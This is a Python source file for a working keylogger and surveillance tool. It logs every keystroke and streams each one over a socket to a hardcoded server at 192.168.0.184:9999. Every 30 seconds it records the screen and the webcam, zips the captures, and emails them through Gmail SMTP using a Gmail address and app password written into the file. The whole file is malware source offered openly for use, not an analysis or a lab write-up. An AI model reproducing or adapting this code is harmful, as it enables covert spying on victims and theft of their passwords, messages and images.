from pynput import keyboard
from datetime import datetime
import os
import threading
import time
import smtplib
import socket
import cv2
import numpy as np
import pyautogui
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import zipfile

# === Configuration ===
log_dir = "logs"
os.makedirs(log_dir, exist_ok=True)

timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
log_file = os.path.join(log_dir, f"keylog_{timestamp}.txt")
screen_file = os.path.join(log_dir, f"screen_{timestamp}.avi")
cam_file = os.path.join(log_dir, f"cam_{timestamp}.avi")
zip_file = os.path.join(log_dir, f"package_{timestamp}.zip")

SENDER_EMAIL = "laurshubham@gmail.com"
SENDER_PASSWORD = "frse chrv kxzb ofbe"
RECIPIENT_EMAIL = "laurshubham@gmail.com"

SERVER_IP = "192.168.0.184"
SERVER_PORT = 9999
key_count = 0

# === Socket Connection ===
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    client_socket.connect((SERVER_IP, SERVER_PORT))
    print("[+] Connected to monitoring server.")
except Exception as e:
    print(f"[!] Could not connect: {e}")
    client_socket = None

# === Helpers ===
def write_log(data):
    with open(log_file, "a") as f:
        f.write(data + "\n")

def zip_logs():
    with zipfile.ZipFile(zip_file, 'w') as zipf:
        for f in [log_file, screen_file, cam_file]:
            if os.path.exists(f) and os.path.getsize(f) > 0:
                zipf.write(f, os.path.basename(f))
    print("[+] Logs zipped.")

def send_email(zip_path):
    msg = MIMEMultipart()
    msg["From"] = SENDER_EMAIL
    msg["To"] = RECIPIENT_EMAIL
    msg["Subject"] = "Keylogger Package (Every 30 sec)"

    try:
        with open(zip_path, "rb") as f:
            part = MIMEBase("application", "zip")
            part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header("Content-Disposition", f"attachment; filename={os.path.basename(zip_path)}")
            msg.attach(part)

        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(SENDER_EMAIL, SENDER_PASSWORD)
        server.send_message(msg)
        server.quit()
        print("[+] Email sent.")
    except Exception as e:
        print(f"[!] Email failed: {e}")

# === Logging ===
def on_press(key):
    global key_count
    key_count += 1
    try:
        k = key.char
    except AttributeError:
        k = f"[{key.name}]"
    line = f"{datetime.now().strftime('%H:%M:%S')} - {k}"
    write_log(line)
    if client_socket:
        try:
            client_socket.sendall((line + "\n").encode())
        except:
            pass

def on_release(key):
    if key == keyboard.Key.esc:
        write_log("--- Session Ended ---")
        write_log(f"Total Keys: {key_count}")
        zip_logs()
        send_email(zip_file)
        print("[*] Stopped.")
        return False

# === Recorders ===
def record_screen():
    size = pyautogui.size()
    out = cv2.VideoWriter(screen_file, cv2.VideoWriter_fourcc(*'XVID'), 5, (size.width, size.height))
    end = time.time() + 30
    while time.time() < end:
        img = pyautogui.screenshot()
        frame = cv2.cvtColor(np.array(img), cv2.COLOR_BGR2RGB)
        out.write(frame)
        time.sleep(1 / 5)
    out.release()
    print("[+] Screen recorded.")

def record_camera():
    cap = cv2.VideoCapture(0)
    width = int(cap.get(3))
    height = int(cap.get(4))
    out = cv2.VideoWriter(cam_file, cv2.VideoWriter_fourcc(*'XVID'), 5, (width, height))
    end = time.time() + 30
    while time.time() < end and cap.isOpened():
        ret, frame = cap.read()
        if ret:
            out.write(frame)
        else:
            break
        time.sleep(1 / 5)
    cap.release()
    out.release()
    print("[+] Camera recorded.")

# === Scheduler ===
def schedule_every_30_seconds():
    def job():
        while True:
            threads = []

            t1 = threading.Thread(target=record_screen)
            t2 = threading.Thread(target=record_camera)

            threads.extend([t1, t2])

            for t in threads:
                t.start()
            for t in threads:
                t.join()

            def zip_and_email():
                zip_logs()
                time.sleep(1)
                send_email(zip_file)

            threading.Thread(target=zip_and_email).start()

            with open(log_file, "w") as f:
                f.write("")

            time.sleep(30)

    threading.Thread(target=job, daemon=True).start()

# === Main ===
def main():
    print("[*] Keylogger started. Press ESC to stop.")
    write_log("--- New Session ---")
    schedule_every_30_seconds()

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
